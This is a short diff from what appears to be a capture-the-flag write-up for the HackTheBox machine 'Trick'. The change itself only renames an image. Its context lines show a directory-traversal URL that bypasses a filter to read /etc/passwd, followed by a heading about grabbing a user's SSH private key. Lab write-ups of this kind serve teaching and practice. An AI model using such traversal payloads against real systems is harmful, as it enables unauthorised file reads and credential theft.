@@ -224,7 +224,7 @@ Upon finding source code for the PHP code for the website from SQLi, we can expl
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Grabbing Michael's SSH Private Key:
 
